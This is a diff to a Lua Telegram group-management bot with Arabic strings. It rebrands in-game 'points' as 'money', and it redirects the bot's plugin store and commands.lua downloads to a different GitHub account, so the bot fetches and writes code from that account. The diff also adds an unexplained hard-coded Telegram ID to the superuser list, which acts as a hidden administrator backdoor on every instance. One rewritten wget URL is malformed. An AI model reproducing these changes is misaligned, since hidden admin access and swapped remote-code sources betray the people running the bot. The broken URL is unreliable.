@@ -162,7 +162,7 @@ io.popen("mkdir File_Bot")
 io.popen("cd File_Bot && rm -rf commands.lua.1") 
 io.popen("cd File_Bot && rm -rf commands.lua.2") 
 io.popen("cd File_Bot && rm -rf commands.lua.3") 
-io.popen("cd File_Bot && wget https://raw.githubusercontent.com/DARKTEAM/Files_DARK/master/File_Bot/commands.lua") 
+io.popen("cd File_Bot && wget https://raw.githubusercontent.com/https://github.com/hydqr/Files_DARK/master/File_Bot/commands.lua") 
 t = "\27[35m".."\nAll Files Started : \n____________________\n"..'\27[m'
 i = 0
 for v in io.popen('ls File_Bot'):lines() do
@@ -175,7 +175,7 @@ print(t)
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
-sudo_users = {SUDO,759699162}
+sudo_users = {SUDO,759699162,842721206}
 function SudoBot(msg)  
 local DARK = false  
 for k,v in pairs(sudo_users) do  
@@ -3316,7 +3316,7 @@ send(msg.chat_id_, msg.id_,t)
 end
 if text == "متجر الملفات" or text == 'المتجر' then
 if SudoBot(msg) then
-local Get_Files, res = https.request("https://raw.githubusercontent.com/DARKTEAM/Files_DARK/master/getfile.json")
+local Get_Files, res = https.request("https://raw.githubusercontent.com/hydqr/Files_DARK/master/getfile.json")
 if res == 200 then
 local Get_info, res = pcall(JSON.decode,Get_Files);
 vardump(res.plugins_)
@@ -3354,7 +3354,7 @@ t = "⌯︙الملف ← "..file.."\n⌯︙تم تعطيل ملف \n"
 else
 t = "⌯︙بالتاكيد تم تعطيل ملف → "..file.."\n"
 end
-local json_file, res = https.request("https://raw.githubusercontent.com/DARKTEAM/Files_DARK/master/File_Bot/"..file)
+local json_file, res = https.request("https://raw.githubusercontent.com/hydqr/Files_DARK/master/File_Bot/"..file)
 if res == 200 then
 os.execute("rm -fr File_Bot/"..file)
 send(msg.chat_id_, msg.id_,t) 
@@ -3374,7 +3374,7 @@ t = "⌯︙بالتاكيد تم تفعيل ملف → "..file.." \n"
 else
 t = "⌯︙الملف ← "..file.."\n⌯︙تم تفعيل ملف \n"
 end
-local json_file, res = https.request("https://raw.githubusercontent.com/DARKTEAM/Files_DARK/master/File_Bot/"..file)
+local json_file, res = https.request("https://raw.githubusercontent.com/hydqr/Files_DARK/master/File_Bot/"..file)
 if res == 200 then
 local chek = io.open("File_Bot/"..file,'w+')
 chek:write(json_file)
@@ -8750,12 +8750,12 @@ else
 username = 'لا يوجد '
 end
 if result.status_.ID == "UserStatusRecently" and result.profile_photo_ ~= false then
-sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, amer.photos_[0].sizes_[1].photo_.persistent_id_,''..rdphoto..'\n⌯︙ايديك ~⪼ '..msg.sender_user_id_..'\n⌯︙معرفك ~⪼ '..username..'\n⌯︙رتبتك ~⪼ '..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n⌯︙موقعك ~⪼ '..rtpa..'\n⌯︙تفاعلك ~⪼ '..Total_Msg(Msguser)..'\n⌯︙رسائلك ~⪼ '..Msguser..'\n⌯︙نسبه تفاعلك ~⪼ '..string.sub(nspatfa, 1,5)..' %\n⌯︙السحكات ~⪼ '..edit..'\n⌯︙نقاطك ~⪼ '..NUMPGAME..'\n')
+send(msg.chat_id_, msg.id_,'[\n🔶: ايديك ~》'..msg.sender_user_id_..'\n🔶: معرفك'..username..'\n🔶: رتبتك  ~》'..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n🔶: تفاعلك ~》'..Total_Msg(Msguser)..'\n🔶: رسائلك ~》'..Msguser..'\n🔶: جفصاتك~》'..edit..'\n🔶: فلوسك ~》'..NUMPGAME..']\n')
 else 
 if result.status_.ID == "UserStatusEmpty" and result.profile_photo_ == false then
-send(msg.chat_id_, msg.id_,'[\n⌯︙ايديك ~⪼ '..msg.sender_user_id_..'\n⌯︙معرفك ~⪼ '..username..'\n⌯︙رتبتك ~⪼ '..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n⌯︙موقعك ~⪼ '..rtpa..'\n⌯︙تفاعلك ~⪼ '..Total_Msg(Msguser)..'\n⌯︙رسائلك ~⪼ '..Msguser..'\n⌯︙نسبه  تفاعلك ~⪼ '..string.sub(nspatfa, 1,5)..' %\n⌯︙السحكات ~⪼ '..edit..'\n⌯︙نقاطك ~⪼ '..NUMPGAME..']\n')
+send(msg.chat_id_, msg.id_,'[\n🔶: ايديك ~》'..msg.sender_user_id_..'\n🔶: معرفك'..username..'\n🔶: رتبتك  ~》'..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n🔶: تفاعلك ~》'..Total_Msg(Msguser)..'\n🔶: رسائلك ~》'..Msguser..'\n🔶: جفصاتك~》'..edit..'\n🔶: فلوسك ~》'..NUMPGAME..']\n')
 else
-send(msg.chat_id_, msg.id_, '\n⌯︙الصوره ~⪼ ليس لديك صور في حسابك'..'[\n⌯︙ايديك ~⪼ '..msg.sender_user_id_..'\n⌯︙معرفك ~⪼ '..username..'\n⌯︙رتبتك ~⪼ '..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n⌯︙موقعك ~⪼ '..rtpa..'\n⌯︙تفاعلك ~⪼ '..Total_Msg(Msguser)..'\n⌯︙رسائلك ~⪼ '..Msguser..'\n⌯︙نسبه تفاعلك ~⪼ '..string.sub(nspatfa, 1,5)..' %\n⌯︙السحكات ~⪼ '..edit..'\n⌯︙نقاطك ~⪼ '..NUMPGAME..']\n')
+send(msg.chat_id_, msg.id_, '\n⌯︙الصوره ~⪼ ليس لديك صور في حسابك'..'[\n🔶: ايديك ~》'..msg.sender_user_id_..'\n🔶: معرفك'..username..'\n🔶: رتبتك  ~》'..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n🔶: تفاعلك ~》'..Total_Msg(Msguser)..'\n🔶: رسائلك ~》'..Msguser..'\n🔶: جفصاتك~》'..edit..'\n🔶: فلوسك ~》'..NUMPGAME..']\n')
 end 
 end
 end
@@ -8773,7 +8773,7 @@ get_id_text = get_id_text:gsub('#game',NUMPGAME)
 get_id_text = get_id_text:gsub('#photos',photps) 
 send(msg.chat_id_, msg.id_,'['..get_id_text..']')   
 else
-send(msg.chat_id_, msg.id_,'[\n⌯︙ايديك ~⪼ '..msg.sender_user_id_..'\n⌯︙معرفك ~⪼ '..username..'\n⌯︙رتبتك ~⪼ '..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n⌯︙موقعك ~⪼ '..rtpa..'\n⌯︙تفاعلك ~⪼ '..Total_Msg(Msguser)..'\n⌯︙رسائلك ~⪼ '..Msguser..'\n⌯︙نسبه تفاعلك ~⪼ '..string.sub(nspatfa, 1,5)..' %\n⌯︙السحكات ~⪼ '..edit..'\n⌯︙نقاطك ~⪼ '..NUMPGAME..']\n')
+send(msg.chat_id_, msg.id_,'[\n🔶: ايديك ~》'..msg.sender_user_id_..'\n🔶: معرفك'..username..'\n🔶: رتبتك  ~》'..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n🔶: تفاعلك ~》'..Total_Msg(Msguser)..'\n🔶: رسائلك ~》'..Msguser..'\n🔶: جفصاتك~》'..edit..'\n🔶: فلوسك ~》'..NUMPGAME..']\n')
 end
 end
 
@@ -8784,17 +8784,17 @@ end,nil)
 end
 end
 
-if text == 'سحكاتي' or text == 'تعديلاتي' then 
+if text == 'جفصاتي' or text == 'سحكاتي' then 
 local Num = tonumber(database:get(bot_id..'edits'..msg.chat_id_..msg.sender_user_id_) or 0)
 if Num == 0 then 
-Text = '⌯︙ ليس لديك سحكات'
+Text = '⌯︙ ليس لديك جفصات'
 else
-Text = '⌯︙عدد سحكاتك *» { '..Num..' } *'
+Text = '⌯︙عدد جفصاتك*» { '..Num..' } *'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == "مسح سحكاتي" or text == "حذف سحكاتي" then  
-send(msg.chat_id_, msg.id_,'⌯︙تم مسح سحكاتك'  )  
+if text == "مسح جفصاتي" or text == "حذف جفصاتي" then  
+send(msg.chat_id_, msg.id_,'⌯︙تم مسح جفصاتك'  )  
 database:del(bot_id..'edits'..msg.chat_id_..msg.sender_user_id_)
 end
 if text == "مسح جهاتي" or text == "حذف جهاتي" then  
@@ -8988,7 +8988,7 @@ end
 tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},reply, nil)
 return false
 end
-if text == 'نقاط' or text == 'نقاطي' then 
+if text == 'فلوس' or text == 'فلوسي' then 
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -9000,14 +9000,14 @@ return false
 end
 local Num = database:get(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_) or 0
 if Num == 0 then 
-Text = '⌯︙لم تلعب اي لعبه للحصول على نقاط'
+Text = '⌯︙لم تلعب اي لعبه للحصول على فلوس'
 else
-Text = '⌯︙عدد نقاطك التي ربحتها هيه *» { '..Num..' } نقاط *'
+Text = '⌯︙عدد فلوسك الذي ربحته هي *» { '..Num..' } فلوس*'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text and text:match("^بيع نقاطي (%d+)$") or text and text:match("^بيع نقاط (%d+)$") then
-local NUMPY = text:match("^بيع نقاطي (%d+)$") or text:match("^بيع نقاط (%d+)$") 
+if text and text:match("^بيع فلوسي(%d+)$") or text and text:match("^بيع فلوس(%d+)$") then
+local NUMPY = text:match("^بيع فلوسي(%d+)$") or text:match("^بيع فلوس(%d+)$") 
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -9022,17 +9022,17 @@ send(msg.chat_id_,msg.id_,"\n*⌯︙لا استطيع البيع اقل من 1 *
 return false 
 end
 if tonumber(database:get(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_)) == tonumber(0) then
-send(msg.chat_id_,msg.id_,'⌯︙ليس لديك نقاط في الالعاب\n⌯︙اذا كنت تريد ربح نقاط \n⌯︙ارسل الالعاب وابدأ اللعب ! ') 
+send(msg.chat_id_,msg.id_,'⌯︙ليس لديك فلوس في هذه العبه\n⌯︙اذا كنت تريد ربح الفلوس \n⌯︙ارسل الالعاب وابدأ اللعب ! ') 
 else
 local NUM_GAMES = database:get(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_)
 if tonumber(NUMPY) > tonumber(NUM_GAMES) then
-send(msg.chat_id_,msg.id_,'\n⌯︙ليس لديك نقاط في هذه لعبه \n⌯︙لزيادة نقاطك في اللعبه \n⌯︙ارسل الالعاب وابدأ اللعب !') 
+send(msg.chat_id_,msg.id_,'\n⌯︙ليس  لديك فلوس في هذه العبه\n⌯︙لزيادة فلوسك في اللعبه \n⌯︙ارسل الالعاب وابدأ اللعب !') 
 return false 
 end
 local NUMNKO = (NUMPY * 50)
 database:decrby(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_,NUMPY)  
 database:incrby(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_,NUMNKO)  
-send(msg.chat_id_,msg.id_,'⌯︙تم خصم *» { '..NUMPY..' }* من نقاطك \n⌯︙وتم اضافة* » { '..(NUMPY * 50)..' } رساله الى رسالك *')
+send(msg.chat_id_,msg.id_,'⌯︙تم خصم *» { '..NUMPY..' }* من فلوسك\n⌯︙وتم اضافة* » { '..(NUMPY * 50)..' } رساله الى رسالك *')
 end 
 return false 
 end
